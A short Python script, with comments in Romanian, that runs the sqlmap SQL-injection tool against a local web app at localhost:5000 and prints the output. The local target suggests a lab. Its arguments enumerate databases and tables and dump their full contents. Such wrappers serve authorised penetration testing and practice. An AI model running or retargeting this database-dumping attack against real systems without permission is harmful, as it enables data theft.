import shutil
import subprocess

TARGET = "http://localhost:5000/cauta?nume=Ion"

# Parametrii SQLMap — adauga/sterge dupa nevoie
SQLMAP_ARGS = [
    "--batch",      # fara intrebari interactive
    "--level=3",    # nivel testare (1-5)
    "--risk=2",     # nivel risc (1-3)
    "--dbs",        # enumera bazele de date
    "--tables",   # enumera tabele (activeaza daca vrei)
    "--dump",     # dump complet
]
# ==============

SQLMAP_CMD = shutil.which("sqlmap")

# Construim comanda completa
cmd = [SQLMAP_CMD, "-u", TARGET] + SQLMAP_ARGS

print("Running:  ", " ".join(cmd))
print("Output -> \n")

# ruleaza si afiseaza outputul in timp real
proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, bufsize=1, text=True)

try:
    for line in proc.stdout:
        print(line, end='')  # line include newline
    proc.wait()
except KeyboardInterrupt:
    print("\nInterrupted by user, terminating sqlmap...")
    proc.terminate()
    proc.wait()

